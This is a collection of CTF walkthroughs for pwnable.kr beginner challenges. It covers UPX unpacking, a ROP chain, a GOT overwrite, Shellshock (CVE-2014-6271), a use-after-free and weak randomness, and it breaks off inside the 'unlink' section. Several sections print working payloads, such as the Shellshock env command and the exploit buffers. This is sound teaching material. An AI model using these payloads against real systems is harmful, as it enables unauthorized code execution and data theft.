This is reversing task. all you need is binary
```

## 2. Solution

As the challenge says it is a reversing task, let's download the binary file and open it in IDA.  

![functions_before_unpark](./functions_before_unpark.png "Fuctions before unpacking")

We can find that there are few functions, and a lot of data are unrecognizable. So it probably has been packed.

Let's use `Shift + F12` to open IDA's string window:  
   
![string_window_in_ida](./string_window_in_ida.png "String window in IDA")  
   
We can find there is a string about UPX, so we can assume that this binary file is probably packed by UPX.

Go to [https://upx.github.io/](https://upx.github.io/ "https://upx.github.io/") and download UPX packer.

Here we work in Windows and unpack the binary file:

```
D:\Tools\upx394w>upx -d flag -o flag.unpacked
                        Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2017
UPX 3.94w       Markus Oberhumer, Laszlo Molnar & John Reiser   May 12th 2017

        File size         Ratio      Format      Name
    --------------------   ------   -----------   -----------
    883745 <-    335288   37.94%   linux/amd64   flag.unpacked

Unpacked 1 file.

D:\Tools\upx394w>
```

Then we open the output file `flag.unpacked` in IDA. Now the binary can be analyzed normally.  

In function `main`, we can see there is a global variable named `flag`:  

![function_main](./function_main.png "Function 'main' in IDA")

Follow the variable and you will see the flag is:

![flag](./flag.png "Flag")




### File: pwnable.kr/Toddler's Bottle/horcruxes/README.md

# pwnable.kr -- Toddler's Bottle -- horcruxes

## 1. Challenge

```
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and ROP it!
author: jiwon choi

ssh horcruxes@pwnable.kr -p2222 (pw:guest)
```

## 2. Solution

Log in via SSH and you will see two files: `horcruxes` and `readme`. `readme` is a text file and it says:

```
horcruxes@ubuntu:~$ cat readme
connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn privilege.
rop it to read the flag.

horcruxes@ubuntu:~$
```

Fine. Let's download `horcruxes` and drop it into IDA. You can find that there are 7 random integers, `a`, `b`, `c`, ... `g`, generated and `sum` is set to the sum of these 7 integers in function `init_ABCDEFG()`. Because the seed of function `rand()` is set by 4 bytes read from `/dev/urandom`, we cannot hack it.

Now let's go to see function `ropme()`. 

```c
int ropme() {
  char s[100]; // [esp+4h] [ebp-74h]
  int v2; // [esp+68h] [ebp-10h]
  int fd; // [esp+6Ch] [ebp-Ch]

  printf("Select Menu:");
  __isoc99_scanf("%d", &v2);
  getchar();
  if ( v2 == a ) {
    A();
  }
  else if ( v2 == b ) {
    B();
  }
  else if ( v2 == c ) {
    C();
  }
  else if ( v2 == d ) {
    D();
  }
  else if ( v2 == e ) {
    E();
  }
  else if ( v2 == f ) {
    F();
  }
  else if ( v2 == g ) {
    G();
  } else {
    printf("How many EXP did you earned? : ");
    gets(s);
    if ( atoi(s) == sum )
    {
      fd = open("flag", 0);
      s[read(fd, s, 0x64u)] = 0;
      puts(s);
      close(fd);
      exit(0);
    }
    puts("You'd better get more experience to kill Voldemort");
  }
  return 0;
}
```

Apparently, function `gets()` is called which means that we can make a buffer overflow and overwrite return address. However, there are something we sould take care of:

1. Naturally we want to set return address to `0x080A010B` which is the start of `fd = open("flag", 0);`. But `0x080A010B` has a bad char `0x0A`, also `\n`, which will stop function `gets()` reading from stdin. So we cannot set return address to `0x080A010B`.

2. The code block we want to execute has the following assembly code:

   ```asm
   .text:080A010B                 sub     esp, 8
   .text:080A010E                 push    0               ; oflag
   .text:080A0110                 push    offset file     ; "flag"
   .text:080A0115                 call    _open
   .text:080A011A                 add     esp, 10h
   .text:080A011D                 mov     [ebp+fd], eax
   .text:080A0120                 sub     esp, 4
   .text:080A0123                 push    64h             ; nbytes
   .text:080A0125                 lea     eax, [ebp+s]
   .text:080A0128                 push    eax             ; buf
   .text:080A0129                 push    [ebp+fd]        ; fd
   .text:080A012C                 call    _read
   .text:080A0131                 add     esp, 10h
   .text:080A0134                 mov     [ebp+eax+s], 0
   .text:080A0139                 sub     esp, 0Ch
   .text:080A013C                 lea     eax, [ebp+s]
   .text:080A013F                 push    eax             ; s
   .text:080A0140                 call    _puts
   .text:080A0145                 add     esp, 10h
   .text:080A0148                 sub     esp, 0Ch
   .text:080A014B                 push    [ebp+fd]        ; fd
   .text:080A014E                 call    _close
   .text:080A0153                 add     esp, 10h
   .text:080A0156                 sub     esp, 0Ch
   .text:080A0159                 push    0               ; status
   .text:080A015B                 call    _exit
   ```

   Obviously we cannot set `ebp` whatever we want which will be affect during buffer overflow. Otherwise an access violation would occur.

I though it would be a hard challenge. But I found that all of function `A()`, `B()`, ... `G()` are located on addresses that have no bad char `\n`:

```
func_A_addr = 0x0809FE4B
func_B_addr = 0x0809FE6A
func_C_addr = 0x0809FE89
func_D_addr = 0x0809FEA8
func_E_addr = 0x0809FEC7
func_F_addr = 0x0809FEE6
func_G_addr = 0x0809FF05
```

So we can execute these functions one by one and get the values of `a`, `b`, `c`, `d`, `e`, `f` and `g`. After that, execute `ropme()` again and input the right sum to get flag.

```
horcruxes@ubuntu:/tmp/solve2$ python2 ./solve.py 
[+] Opening connection to localhost on port 9032: Done
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and destroy it!

Select Menu: 1
How many EXP did you earned? :  00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\x00aaaK\xfe   j\xfe   \x89\xfe   \xa8\xfe   ��   ��  \x05\xff   ��   
You'd better get more experience to kill Voldemort
You found "Tom Riddle's Diary" (EXP +15452973)
You found "Marvolo Gaunt's Ring" (EXP +-1153331378)
You found "Helga Hufflepuff's Cup" (EXP +-1491435822)
You found "Salazar Slytherin's Locket" (EXP +129335114)
You found "Rowena Ravenclaw's Diadem" (EXP +-1692814741)
You found "Nagini the Snake" (EXP +-1940301612)
You found "Harry Potter" (EXP +94303011)

Select Menu: 1
How many EXP did you earned? :  -1743825159
xxxxxxxxxxxxxxxxxxxxxxxxxxxx!

[*] Closed connection to localhost port 9032
```



### File: pwnable.kr/Toddler's Bottle/input/README.md

# pwnable.kr -- Toddler's Bottle -- input

## 1. Challenge

```
Mom? how can I pass my input to a computer program?

ssh input2@pwnable.kr -p2222 (pw:guest)
```

## 2. Solution

Log in via SSH and you will see 3 files: `flag`, `input` and `input.c`. Of course you cannot use `cat flag` to see the content of file `flag`. Let's see the source code of file `input` first:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
        printf("Welcome to pwnable.kr\n");
        printf("Let's see if you know how to give input to program\n");
        printf("Just give me correct inputs then you will get the flag :)\n");

        // argv
        if(argc != 100) return 0;
        if(strcmp(argv['A'],"\x00")) return 0;
        if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
        printf("Stage 1 clear!\n");

        // stdio
        char buf[4];
        read(0, buf, 4);
        if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
        read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
        printf("Stage 2 clear!\n");

        // env
        if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
        printf("Stage 3 clear!\n");

        // file
        FILE* fp = fopen("\x0a", "r");
        if(!fp) return 0;
        if( fread(buf, 4, 1, fp)!=1 ) return 0;
        if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
        fclose(fp);
        printf("Stage 4 clear!\n");

        // network
        int sd, cd;
        struct sockaddr_in saddr, caddr;
        sd = socket(AF_INET, SOCK_STREAM, 0);
        if(sd == -1){
                printf("socket error, tell admin\n");
                return 0;
        }
        saddr.sin_family = AF_INET;
        saddr.sin_addr.s_addr = INADDR_ANY;
        saddr.sin_port = htons( atoi(argv['C']) );
        if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
                printf("bind error, use another port\n");
                return 1;
        }
        listen(sd, 1);
        int c = sizeof(struct sockaddr_in);
        cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
        if(cd < 0){
                printf("accept error, tell admin\n");
                return 0;
        }
        if( recv(cd, buf, 4, 0) != 4 ) return 0;
        if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
        printf("Stage 5 clear!\n");

        // here's your flag
        system("/bin/cat flag");
        return 0;
}
```

It seems we have to pass these 5 stages. Let's solve them one by one.

### Stage 1

This stage is about `argv`. You can use `execve` to pass 100 arguments. 

```c
char* argv[101];
for (int i = 0; i < 100; ++i)
    argv[i] = "/home/input2/input";
argv['A'] = "\x00";
argv['B'] = "\x20\x0a\x0d";
argv[100] = NULL;
execve("/home/input2/input", argv, NULL);
```

### Stage 2

This stage is about redirecting `stdin` and `stderr`. 

We know that child process will inherit `stdin`, `stdout` and `stderr` file descriptors of parent process. So we can first create two anonymous pipes which stand for `stdin` and `stderr` respectively, then fork a child process and replace child process' `stdin` and `stderr` by the two pipes. After the child process lanuch `/home/input2/input`, the `stdin` and `stderr` of `/home/input2/input` will have been redirected.

```c
pid_t child_pid;
int pipe_stdin[2];
int pipe_stderr[2];
if (pipe(pipe_stdin) == -1 || pipe(pipe_stderr) == -1) {
    printf("Failed to create pipe.\n");
    exit(0);
}
#define STDIN_READ   pipe_stdin[0]
#define STDIN_WRITE  pipe_stdin[1]
#define STDERR_READ  pipe_stderr[0]
#define STDERR_WRITE pipe_stderr[1]
child_pid = fork();
if (child_pid == -1) {
    printf("Failed to fork.\n");
    exit(0);
} else if (child_pid == 0) {
    dup2(STDIN_READ, 0);
    dup2(STDERR_READ, 2);
    execve("/home/input2/input", argv, envp);
    exit(0);
} else {
    write(STDIN_WRITE, "\x00\x0a\x00\xff", 4);
    write(STDERR_WRITE, "\x00\x0a\x02\xff", 4);
}
```

### Stage 3

This stage is about environment variables.

You can use `execve` to pass new environment variables.

```c
char* envp[2];
envp[0] = "\xde\xad\xbe\xef=\xca\xfe\xba\xbe";
envp[1] = NULL;
execve("/home/input2/input", argv, envp);
```

### Stage 4

This stage is about file.

Just create file and write required bytes to it.

```c
FILE* hFile = fopen("\x0a", "w");
if (hFile == NULL) {
    printf("Failed to create file.\n");
    exit(0);
}
fwrite("\x00\x00\x00\x00", 4, 1, hFile);
fclose(hFile);
```

### Stage 5

This stage is about network.

Use socket to pass this stage. Don't forget to specify a port in `argv['C']`.

```
argv['C'] = "33333";
```

```c
int sock;
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(33333);
addr.sin_addr.s_addr = inet_addr("127.0.0.1");
sock = socket(AF_INET, SOCK_STREAM, 0);
connect(sock, (struct sockaddr*)&addr, sizeof(addr));
send(sock, "\xde\xad\xbe\xef", 4, 0);
close(sock);
```

Now upload your code to `/tmp` and use `gcc` to compile.

```bash
input2@ubuntu:~$ mkdir /tmp/solve2
input2@ubuntu:~$ cd /tmp/solve2
input2@ubuntu:/tmp/solve2$ vim solve.c                  # Paste your code in vim
input2@ubuntu:/tmp/solve2$ gcc ./solve.c -o solve
input2@ubuntu:/tmp/solve2$ ln -s /home/input2/flag      # Don't forget to create a symbol link to /home/input2/flag.
                                                        # Otherwise you will get nothing.

input2@ubuntu:/tmp/solve2$ ./solve
Welcome to pwnable.kr
Let's see if you know how to give input to program
Just give me correct inputs then you will get the flag :)
Stage 1 clear!
Stage 2 clear!
Stage 3 clear!
Stage 4 clear!
Stage 5 clear!
Mommy! I learned how to pass various input in Linux :)
```



### File: pwnable.kr/Toddler's Bottle/leg/README.md

# pwnable.kr -- Toddler's Bottle -- leg

## 1. Challenge

```
Daddy told me I should study arm.
But I prefer to study my leg!

Download : http://pwnable.kr/bin/leg.c
Download : http://pwnable.kr/bin/leg.asm

ssh leg@pwnable.kr -p2222 (pw:guest)
```

## 2. Solution

Review code in `leg.c`. You can see just make sure that expression `key1()+key2()+key3()) == key` is true where the value of `key` depends on your input.

Review assembly code in `leg.asm`.

1. __key1()__

   ```
   (gdb) disass key1
   Dump of assembler code for function key1:
       0x00008cd4 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
       0x00008cd8 <+4>:	add	r11, sp, #0
       0x00008cdc <+8>:	mov	r3, pc
       0x00008ce0 <+12>:	mov	r0, r3
       0x00008ce4 <+16>:	sub	sp, r11, #0
       0x00008ce8 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
       0x00008cec <+24>:	bx	lr
   End of assembler dump.
   ```

   You can see `0x00008cdc <+8>:	mov	r3, pc` where the value of `pc` is `0x00008ce4`.

   So __key1()__ returns `0x00008ce4`.

2. __key2()__

   ```
   (gdb) disass key2
   Dump of assembler code for function key2:
       0x00008cf0 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
       0x00008cf4 <+4>:	add	r11, sp, #0
       0x00008cf8 <+8>:	push	{r6}		; (str r6, [sp, #-4]!)
       0x00008cfc <+12>:	add	r6, pc, #1
       0x00008d00 <+16>:	bx	r6
       0x00008d04 <+20>:	mov	r3, pc
       0x00008d06 <+22>:	adds	r3, #4
       0x00008d08 <+24>:	push	{r3}
       0x00008d0a <+26>:	pop	{pc}
       0x00008d0c <+28>:	pop	{r6}		; (ldr r6, [sp], #4)
       0x00008d10 <+32>:	mov	r0, r3
       0x00008d14 <+36>:	sub	sp, r11, #0
       0x00008d18 <+40>:	pop	{r11}		; (ldr r11, [sp], #4)
       0x00008d1c <+44>:	bx	lr
   End of assembler dump.
   ```

   When the program runs to 0x00008d04, `pc` is `0x00008d08` so `r3` will be assigned `0x00008d08` to.

   Then `adds	r3, #4`, `r3` will be `0x00008d0C`. After that `r3` will not be modified so __key2()__ returns `0x00008d0C`.

3. __key3()__

   ```
   (gdb) disass key3
   Dump of assembler code for function key3:
       0x00008d20 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
       0x00008d24 <+4>:	add	r11, sp, #0
       0x00008d28 <+8>:	mov	r3, lr
       0x00008d2c <+12>:	mov	r0, r3
       0x00008d30 <+16>:	sub	sp, r11, #0
       0x00008d34 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
       0x00008d38 <+24>:	bx	lr
   End of assembler dump.
   ```

   `lr` stores the address of return. So go back to see the assembly code of `main` and you will find:

   ```
   0x00008d7c <+64>:	bl	0x8d20 <key3>
   0x00008d80 <+68>:	mov	r3, r0
   ```

   So __key3()__ returns `0x00008d80`.

Obviously, the value of `key` must be `0x00008ce4 + 0x00008d0C + 0x00008d80 = 0x1a770` which is `108400` in base 10.

So connect via SSH, and in terminal:

```bash
$ ./leg
Daddy has very strong arm! :
```

Just type `108400` and you will get the flag.
  



### File: pwnable.kr/Toddler's Bottle/lotto/README.md

# pwnable.kr -- Toddler's Bottle -- lotto

## 1. Challenge

```
Mommy! I made a lotto program for my homework.  
do you want to play?  
      
ssh lotto@pwnable.kr -p2222 (pw:guest)  
```

## 2. Solution

See source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){

        int i;
        printf("Submit your 6 lotto bytes : ");
        fflush(stdout);

        int r;
        r = read(0, submit, 6);

        printf("Lotto Start!\n");
        //sleep(1);

        // generate lotto numbers
        int fd = open("/dev/urandom", O_RDONLY);
        if(fd==-1){
                printf("error. tell admin\n");
                exit(-1);
        }
        unsigned char lotto[6];
        if(read(fd, lotto, 6) != 6){
                printf("error2. tell admin\n");
                exit(-1);
        }
        for(i=0; i<6; i++){
                lotto[i] = (lotto[i] % 45) + 1;         // 1 ~ 45
        }
        close(fd);

        // calculate lotto score
        int match = 0, j = 0;
        for(i=0; i<6; i++){
                for(j=0; j<6; j++){
                        if(lotto[i] == submit[j]){
                                match++;
                        }
                }
        }

        // win!
        if(match == 6){
                system("/bin/cat flag");
        }
        else{
                printf("bad luck...\n");
        }

}

void help(){
        printf("- nLotto Rule -\n");
        printf("nlotto is consisted with 6 random natural numbers less than 46\n");
        printf("your goal is to match lotto numbers as many as you can\n");
        printf("if you win lottery for *1st place*, you will get reward\n");
        printf("for more details, follow the link below\n");
        printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
        printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

        // menu
        unsigned int menu;

        while(1){

                printf("- Select Menu -\n");
                printf("1. Play Lotto\n");
                printf("2. Help\n");
                printf("3. Exit\n");

                scanf("%d", &menu);

                switch(menu){
                        case 1:
                                play();
                                break;
                        case 2:
                                help();
                                break;
                        case 3:
                                printf("bye\n");
                                return 0;
                        default:
                                printf("invalid menu\n");
                                break;
                }
        }
        return 0;
}
```

The problem is here:

```c
// calculate lotto score
int match = 0, j = 0;
for(i=0; i<6; i++){
        for(j=0; j<6; j++){
                if(lotto[i] == submit[j]){
                        match++;
                }
        }
}

// win!
if(match == 6){
        system("/bin/cat flag");
}
else{
        printf("bad luck...\n");
}
```

It seems the program wants to perform an order-insensitive comparation. But such code is wrong for it does not remove matched elements when comparing. 

We can submit 6 chars that are the same. If one of chars we submit is in `lotto` array, we can win the game. 

Try `"!!!!!!"` serveral times and you will see the flag.



### File: pwnable.kr/Toddler's Bottle/memcpy/README.md

# pwnable.kr -- Toddler's Bottle -- memcpy

## 1. Challenge

```
Are you tired of hacking?, take some rest here.
Just help me out with my small experiment regarding memcpy performance.
after that, flag is yours.

http://pwnable.kr/bin/memcpy.c

ssh memcpy@pwnable.kr -p2222 (pw:guest)
```

## 2. Solution

Connect target via SSH and see source code:

```c
// compiled with : gcc -o memcpy memcpy.c -m32 -lm
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include <math.h>

unsigned long long rdtsc(){
asm("rdtsc");
}

char* slow_memcpy(char* dest, const char* src, size_t len){
int i;
for (i=0; i<len; i++) {
        dest[i] = src[i];
}
return dest;
}

char* fast_memcpy(char* dest, const char* src, size_t len){
size_t i;
// 64-byte block fast copy
if(len >= 64){
        i = len / 64;
        len &= (64-1);
        while(i-- > 0){
                __asm__ __volatile__ (
                "movdqa (%0), %%xmm0\n"
                "movdqa 16(%0), %%xmm1\n"
                "movdqa 32(%0), %%xmm2\n"
                "movdqa 48(%0), %%xmm3\n"
                "movntps %%xmm0, (%1)\n"
                "movntps %%xmm1, 16(%1)\n"
                "movntps %%xmm2, 32(%1)\n"
                "movntps %%xmm3, 48(%1)\n"
                ::"r"(src),"r"(dest):"memory");
                dest += 64;
                src += 64;
        }
}

// byte-to-byte slow copy
if(len) slow_memcpy(dest, src, len);
return dest;
}

int main(void){

setvbuf(stdout, 0, _IONBF, 0);
setvbuf(stdin, 0, _IOLBF, 0);

printf("Hey, I have a boring assignment for CS class.. :(\n");
printf("The assignment is simple.\n");

printf("-----------------------------------------------------\n");
printf("- What is the best implementation of memcpy?        -\n");
printf("- 1. implement your own slow/fast version of memcpy -\n");
printf("- 2. compare them with various size of data         -\n");
printf("- 3. conclude your experiment and submit report     -\n");
printf("-----------------------------------------------------\n");

printf("This time, just help me out with my experiment and get flag\n");
printf("No fancy hacking, I promise :D\n");

unsigned long long t1, t2;
int e;
char* src;
char* dest;
unsigned int low, high;
unsigned int size;
// allocate memory
char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

size_t sizes[10];
int i=0;

// setup experiment parameters
for(e=4; e<14; e++){    // 2^13 = 8K
        low = pow(2,e-1);
        high = pow(2,e);
        printf("specify the memcpy amount between %d ~ %d : ", low, high);
        scanf("%d", &size);
        if( size < low || size > high ){
                printf("don't mess with the experiment.\n");
                exit(0);
        }
        sizes[i++] = size;
}

sleep(1);
printf("ok, lets run the experiment with your configuration\n");
sleep(1);

// run experiment
for(i=0; i<10; i++){
        size = sizes[i];
        printf("experiment %d : memcpy with buffer size %d\n", i+1, size);
        dest = malloc( size );

        memcpy(cache1, cache2, 0x4000);         // to eliminate cache effect
        t1 = rdtsc();
        slow_memcpy(dest, src, size);           // byte-to-byte memcpy
        t2 = rdtsc();
        printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1);

        memcpy(cache1, cache2, 0x4000);         // to eliminate cache effect
        t1 = rdtsc();
        fast_memcpy(dest, src, size);           // block-to-block memcpy
        t2 = rdtsc();
        printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1);
        printf("\n");
}

printf("thanks for helping my experiment!\n");
printf("flag : ----- erased in this source code -----\n");
return 0;
}
```

We can see the program use SSE instruction set to accelerate the speed of copying memory data. However there's a requirement when reading memory data to `xmm_` registers or writing `xmm_` registers' data to memory. That is addresses of memory data read from to `xmm_` registers or written to from `xmm_` registers must be 16-bytes-aligned. In other words, the addresses must be a multiple of 16.

So make sure that every time the size of allocated memory plus 8 should be a multiple of 16 and then the test can be done without any errors.

As for why we should add 8 to the size of allocated memory, it is because 8 is the size of two members, `prev_size` and `size`, in structure `malloc_chunk` which is before the memory allocated.



### File: pwnable.kr/Toddler's Bottle/mistake/README.md

# pwnable.kr -- Toddler's Bottle -- mistake

## 1. Challenge

```
We all make mistakes, let's move on.
(don't take this too seriously, no fancy hacking skill is required at all)

This task is based on real event
Thanks to dhmonkey

hint : operator priority

ssh mistake@pwnable.kr -p2222 (pw:guest)
```

## 2. Solution

Connect target via ssh and see source code:

```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
int i;
for(i=0; i<len; i++){
        s[i] ^= XORKEY;
}
}

int main(int argc, char* argv[]){

int fd;
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
        printf("can't open password %d\n", fd);
        return 0;
}

printf("do not bruteforce...\n");
sleep(time(0)%20);

char pw_buf[PW_LEN+1];
int len;
if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
        printf("read error\n");
        close(fd);
        return 0;
}

char pw_buf2[PW_LEN+1];
printf("input password : ");
scanf("%10s", pw_buf2);

// xor your input
xor(pw_buf2, 10);

if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
        printf("Password OK\n");
        system("/bin/cat flag\n");
}else{
        printf("Wrong Password\n");
}

close(fd);
return 0;
}
```

We can see that the operator priority is confused. So actually the password is decided by your first input.

The second input should be characters in the first input xor by `1`.

```bash
mistake@ubuntu:~$ ./mistake
do not bruteforce...
1111111111
input password : 0000000000
Password OK
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```



### File: pwnable.kr/Toddler's Bottle/passcode/README.md

# pwnable.kr -- Toddler's Bottle -- passcode

## 1. Challenge

```
Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
```

## 2. Solution

Connect target via ssh and see source code:

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
    int passcode1;
    int passcode2;

    printf("enter passcode1 : ");
    scanf("%d", passcode1);
    fflush(stdin);

    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf("enter passcode2 : ");
    scanf("%d", passcode2);

    printf("checking...\n");
    if(passcode1==338150 && passcode2==13371337){
            printf("Login OK!\n");
            system("/bin/cat flag");
    }
    else{
            printf("Login Failed!\n");
            exit(0);
    }
}

void welcome(){
    char name[100];
    printf("enter you name : ");
    scanf("%100s", name);
    printf("Welcome %s!\n", name);
}

int main(){
    printf("Toddler's Secure Login System 1.0 beta.\n");

    welcome();
    login();

    // something after login...
    printf("Now I can safely trust you that you have credential :)\n");
    return 0;
}

```

Obviously, function `scanf()` is called incorrectly.

So we must make sure that `passcode1` and `passcode2` should be a valid address or the program would crash. Of course, we can also leave it empty so addresses that are equal to `passcode1` or `passcode2` would not be accessed.

But what is the value of `passcode1` and `passcode2`? Well, it depends on `char name[100]` in function `welcome()`. Let's see the stack layout of function `welcome()` and `login()`:

![stack_layout](stack_layout.png)

We can find we could affect `passcode1` but could not affect `passcode2`. Because `scanf()` only accepts 100 characters in function `welcome()`.

However, there still one way out. Actually, when program access to a invalid address, it would raise an exception and then calls `exit()` to terminate. So, we can change the offset of function `exit()` at Global Offset Table(GOT) to `0x080485e3`:

```asm
@0x080485e3
mov     dword ptr [esp], offset command ; "/bin/cat flag"
call    _system
```

So you can build exploit buffer:

```python
exp_buf = 'a' * 96 + '\x18\xa0\x04\x08'
```

When you are asked to type your name, just send it.

When you are asked to type `passcode1`, send:

```python
payload = str(0x080485e3)
```
to change the offset of function `exit()` to shell entry(0x080485e3).

Finally, you will get the flag.



### File: pwnable.kr/Toddler's Bottle/random/README.md

# pwnable.kr -- Toddler's Bottle -- random

# 1. Challenge

```
Daddy, teach me how to use random value in programming!  

ssh random@pwnable.kr -p2222 (pw:guest)  
```

# 2. Solution

Just connect target via ssh and see source code:  

```c
#include <stdio.h>

int main(){
  unsigned int random;
  random = rand();	// random value!

  unsigned int key=0;
  scanf("%d", &key);

  if( (key ^ random) == 0xdeadbeef ){
    printf("Good!\n");
    system("/bin/cat flag");
    return 0;
  }

  printf("Wrong, maybe you should try 2^32 cases.\n");
  return 0;
}
```

You can see that the seed of random function is not set in the source code, which means that the integer variable `random` is predicable every time the program starts.

On Linux, the integer variable `random` must be `0x6b8b4567`.

So the key should be:

```
0x6b8b4567 ^ 0xdeadbeef = 0xB526FB88 = 3039230856
```

Just input the key and then get the flag.



### File: pwnable.kr/Toddler's Bottle/shellshock/README.md

# pwnable.kr -- Toddler's Bottle -- shellshock

## 1. Challenge

```
Mommy, there was a shocking news about bash.  
I bet you already know, but lets just make it sure :)  
    
ssh shellshock@pwnable.kr -p2222 (pw:guest)  
```

## 2. Solution

Connect via SSH.

In current directory, it provides a `bash` that has CVE-2014-6271 exploit.

We can test it by typing:

```bash
$ env x='() { :;}; echo fuckfuck' ./bash -c "echo haha"
```

And we can find that both `"fuckfuck"` and `"haha"` are typed out.

Review the source code of the binary file `shellshock`, which is in file `shellshock.c`. We can find that `shellshock` has right to read `flag` and it will launch the exploitable `bash`.

So, just type:

```bash
$ env x='() { :;}; /bin/cat flag' ./shellshock
```

Then you will see the flag.



### File: pwnable.kr/Toddler's Bottle/uaf/README.md

# pwnable.kr -- Toddler's Bottle -- uaf

## 1. Challenge

```
Mommy, what is Use After Free bug?  

ssh uaf@pwnable.kr -p2222 (pw:guest)  
```

## 2. Solution

Connect target via ssh and see source code:

```cpp
#include <fcntl.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
    virtual void give_shell() {
        system("/bin/sh");
    }
protected:
    int age;
    string name;
public:
    virtual void introduce(){
        cout << "My name is " << name << endl;
        cout << "I am " << age << " years old" << endl;
    }
};

class Man: public Human{
public:
    Man(string name, int age){
        this->name = name;
        this->age = age;
    }
    virtual void introduce(){
        Human::introduce();
        cout << "I am a nice guy!" << endl;
    }
};

class Woman: public Human{
public:
    Woman(string name, int age){
        this->name = name;
        this->age = age;
    }
    virtual void introduce(){
        Human::introduce();
        cout << "I am a cute girl!" << endl;
    }
};

int main(int argc, char* argv[]){
    Human* m = new Man("Jack", 25);
    Human* w = new Woman("Jill", 21);

    size_t len;
    char* data;
    unsigned int op;
    while(1){
        cout << "1. use\n2. after\n3. free\n";
        cin >> op;

        switch(op){
                case 1:
                        m->introduce();
                        w->introduce();
                        break;
                case 2:
                        len = atoi(argv[1]);
                        data = new char[len];
                        read(open(argv[2], O_RDONLY), data, len);
                        cout << "your data is allocated" << endl;
                        break;
                case 3:
                        delete m;
                        delete w;
                        break;
                default:
                        break;
        }
    }

    return 0;
}
```

We can see if we choose `"3. free"` and then choose `"1. use"`, it is a classical behavior called `"use after free"`. In this situation, we could not guarantee that it is the member function `introduce()` that is called.

If you do not know why, let's see the memory layout of each class:

| offset |             class Human               |              class Man             |                class Woman           |
|--------|---------------------------------------|------------------------------------|--------------------------------------|
|   +0   | a pointer to `Human` class's vftable  | a pointer to `Man` class's vftable | a pointer to `Woman` class's vftable |
|   +8   |               int age                 |               int age              |               int age                |
|   +16  |           std::string name            |           std::string name         |           std::string name           |
|   +24  |                 (end)                 |                (end)               |                 (end)                |

But what does the vftable of each class looks like? Well, you can see it in IDA:  

![vftables](vftables.png)

Now let's see how virtual function is called:

![call_virtual_func](call_virtual_func.png)

We can obviously see the program looks for vftable first, then calls the second function pointer which points to its own `introduce()` function.

In the mean time you can see the third function pointer in the vftable points to a shell function that can help us get a shell. So if we try to modify the pointer that points to vftable, a wrong function wound be called when the program wants to call `introduce()`.

We know the size of each class' objects is 24 bytes. And the two objects, `m` and `w`, are allocated at heap. After the two objects are deleted/released, the corresponding two heap chunks are marked free. If we allocate a heap chunk which has the same size with the size of the two objects, the address returned would probably be equal to `Human* m` or `Human* w`.

Here's the solution:

```bash
uaf@ubuntu:~$ python3 -c "print('\x68\x15\x40\x00\x00\x00\x00\x00')" > /tmp/payload
uaf@ubuntu:~$ ./uaf 24 "/tmp/payload"
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ ls
flag  uaf  uaf.cpp
$
```



### File: pwnable.kr/Toddler's Bottle/unlink/README.md

# pwnable.kr -- Toddler's Bottle -- unlink

## 1. Challenge

```
Daddy! how can I exploit unlink corruption?

ssh unlink@pwnable.kr -p2222 (pw: guest)
```

## 2. Solution

Connect target via ssh and see source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
    struct tagOBJ* fd;
    struct tagOBJ* bk;
    char buf[8];
} OBJ;

void shell(){
    system("/bin/sh");
}

void unlink(OBJ* P){
    OBJ* BK;
    OBJ* FD;
    BK=P->bk;
    FD=P->fd;
    FD->bk=BK;
    BK->fd=FD;
}
int main(int argc, char* argv[]){
    malloc(1024);
